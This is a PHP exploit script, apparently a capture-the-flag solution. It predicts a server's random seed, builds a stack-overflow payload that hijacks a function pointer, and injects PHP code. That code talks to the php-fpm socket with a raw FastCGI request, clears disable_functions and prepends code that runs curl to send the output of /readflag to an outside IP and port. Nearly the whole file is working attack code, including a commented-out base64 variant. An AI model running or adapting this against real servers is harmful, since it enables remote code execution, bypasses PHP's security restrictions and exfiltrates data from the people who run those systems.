<?php

// show_source,error_lpg,readfile

function cyclic($num) {
	$res = "";
	for ($i = 0; $i < $num; $i++) {
		$res .= "v";
	}
	return $res;
}

function post($url, $data) {
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_HEADER, 1);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($curl, CURLOPT_POST, 1);
	curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data));
	$html = curl_exec($curl);
	curl_close($curl);
	preg_match_all("/Date: (.*?) GMT/", $html, $matches);
	$sss = strtotime($matches[1][0] . " GMT");
	print_r("server seed = " . $sss . "\r\n");
	global $seed;
	print_r("time = \$seed - \$sss = " . ($seed - $sss) . "\r\n");
	print_r($html);
}

function handleData($arg1) {
	$arg1_len = strlen($arg1);
	$len = $arg1_len / 4 + (1 * ($arg1_len % 4));
	$strarray = str_split($arg1, 4);
	$strarray[$len - 1] = str_pad($strarray[$len - 1], 4, "\x00");
	foreach ($strarray as $key => &$value) {
		$value = strrev(bin2hex($value));
	}
	return $strarray;
}
function strrevhex($data) {
	$r = "";
	$data = strrev($data);
	for ($i = 0; $i < strlen($data); $i++) {
		if ($i % 2 == 0) {
			$r .= "\\x";
		}
		$r .= "$data[$i]";
	}
	eval("\$r = \"$r\";");
	return $r;
}

$seed = time();
echo "seed = $seed\r\n";
srand($seed);
$INS_OFFSET = rand(0, 0xffff); // 65535
$table = 'abcdefghijklmnopqrstuvwxyzABCDEFGHJKLMNPQEST123456789';
$a1 = $table[rand(0, strlen($table) - 1)];
$a2 = $table[rand(0, strlen($table) - 1)];
$a3 = $table[rand(0, strlen($table) - 1)];
$bottom = handleData($a1 . $a2 . $a3 . "\x00")[0];
$ebp = 0xfffe0000 + rand(0x0, 0xffff);
$stack[$ebp] = $ebp + rand(0, 0xffff);
$esp_addr = $ebp - rand(0x20, 0x60) * 0x4;
$bottom_addr = $ebp - 4;
$pianyi = $bottom_addr - $esp_addr;
// $ff = intval($_GET['f']); // function addr point
$ff = 41;
$func_addr_point = $func_addr = $ff + 0x60000000 + $INS_OFFSET + 0x1;
$bottom_data = strrevhex($bottom);
$func_addr = strrevhex(dechex($func_addr));
$argn = 0;
$post_data = [];
$ans = "";
// foreach ($_GET["args"] as $an => $arg) {
// 	$ans .= "arg{$an}";
// 	$post_data["arg{$an}"] = $arg;
// 	$argn++;
// }
$ans .= "arg0arg1";
$post_data["arg0"] = "";
// $post_data["arg1"] = '}stream_socket_sendto(stream_socket_client("unix:///run/php/php7.3-fpm.sock",$e,$s,30),urldecode("%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%FF%07%00%0B%80%00%00%09SERVER_NAME127.0.0.1%0E%80%00%00%03REQUEST_METHODGET%0F%80%00%00%17SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%0F%80%00%00%91PHP_ADMIN_VALUEallow_url_include%3DOn%0Adisable_functions%3D%0Aauto_prepend_file%3Ddata%3A%2CPD9waHAgc3lzdGVtKCJjdXJsIGh0dHA6Ly83OTUxODM4NTI6ODg5OS9gL3Jl%0AYWRmbGFnYCIpOw%3d%3d%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%00%00%00"));//';
$post_data["arg1"] = '}$fp=stream_socket_client("unix:///run/php/php7.3-fpm.sock", $errno, $errstr,30);$out=urldecode("%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%E5%05%00%0B%80%00%00%09SERVER_NAME127.0.0.1%0E%80%00%00%03REQUEST_METHODGET%0F%80%00%00%17SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%0F%80%00%00wPHP_ADMIN_VALUEallow_url_include%3DOn%0Adisable_functions%3D%0Aauto_prepend_file%3Ddata,<php%20system%28%22curl%20http%3A%2F%2F795183852%3A8899%2F%60%2Freadflag%60%22%29%3B%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%00%00%00");stream_socket_sendto($fp,$out);while (!feof($fp)) {echo htmlspecialchars(fgets($fp,10));}fclose($fp);//';
// $arg_num="{$argn}" . "\x00\x00\x00";
$arg_num = "2" . "\x00\x00\x00";
$payload = cyclic($pianyi) . $bottom_data . "\x00\x00\x00\x00";
$payload .= $func_addr . $arg_num; //. "func";
$payload .= $ans;
$post_data['data'] = $payload;
if ($an >= 0) {
	$post_data[$func_addr_point] = 1;
}
print_r($post_data);
echo "\r\n\r\n#########################\r\n\r\n";
// post('http://34.85.27.91:10080/',$post_data);
post('http://xxxxxxx:8307/output.php', $post_data);
